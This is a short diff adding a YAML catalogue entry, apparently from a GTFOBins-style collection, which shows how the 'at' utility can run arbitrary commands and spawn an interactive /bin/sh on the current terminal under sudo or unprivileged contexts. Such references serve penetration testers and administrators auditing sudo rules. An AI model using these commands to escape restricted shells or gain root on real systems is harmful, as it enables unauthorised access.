@@ -1,0 +1,19 @@
+---
+functions:
+  command:
+  - code: |-
+      echo /path/to/command | at now
+    comment: |-
+      The invocation will be blind.
+    contexts:
+      sudo:
+      unprivileged:
+  shell:
+  - code: |-
+      echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
+    comment: |-
+      `tail` is used to pause the terminal.
+    contexts:
+      sudo:
+      unprivileged:
+...
